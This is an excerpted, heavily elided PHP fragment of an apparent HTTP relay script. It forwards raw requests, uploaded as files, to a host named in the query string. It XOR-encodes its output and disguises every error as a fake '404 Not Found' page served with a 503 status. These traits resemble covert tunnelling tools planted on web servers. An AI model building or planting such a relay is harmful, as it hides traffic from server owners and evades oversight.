...
function print_crypt($in, $hash)
{
	$encode_pos = 0;
	$k = strlen($in);
	for($i = 0; $i < $k; $i++)
	{
		echo chr(ord($in[$i]) ^ ord($hash[$encode_pos++]));
		if($encode_pos == 256)
		{
			$encode_pos = 0;
		}
...
function print_error($hdr, $title, $text, $info, $st, $co, $hash)
{
...
function create_header($method, $host, $uri, $protocol, $aut, $useaut)
{
	...
	if(empty($id))
	{
		print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "no id defined", $st, $co, $hash);
		exit;
	}
	...
	if($en)
	{
		...
		if($id === FALSE)
		{
			print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "incorrect id defined: ".$id." [".$_SERVER["QUERY_STRING"]."]", $st, $co, $hash);
			exit;
		}
	}
	...
	if(empty($aid["host"]))
	{
		print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "url parse error, no host defined: ".$id." [".$_SERVER["QUERY_STRING"]."]", $st, $co, $hash);
		exit;
	}
	...
	if(!empty($px))
	{
		...
		if(empty($px_host))
		{
			print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "no px_host defined: ".$px, $st, $co, $hash);
			exit;
		}
	...
	if(!empty($px) || (!empty($aid["scheme"]) && ($aid["scheme"] === "http")))
	{
		if($pm)
		{
			if(isset($_FILES['request']) && !empty($_FILES['request']['tmp_name']) && (!isset($_FILES['request']['error']) || ($_FILES['request']['error'] == 0)))
			{
				...
				if(!$fp)
				{
					print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "can't open request file", $st, $co, $hash);
					exit;
				}
			...
			{
				print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "no request defined", $st, $co, $hash);
				exit;
			}
		}
		else
		...
		if(!$socket)
		{
			print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "can't connect with fsockopen(): ".$errstr." (".$errno.")", $st, $co, $hash);
			exit;
		}

		if(!fwrite($socket, $in, strlen($in)))
		{
			print_error("HTTP/1.1 503 Service Temporarily Unavailable", "Error: HTTP/1.1 404 Not Found", "File Not Found", "can't write with fwrite()", $st, $co, $hash);
			fclose($socket);
			exit;
		}
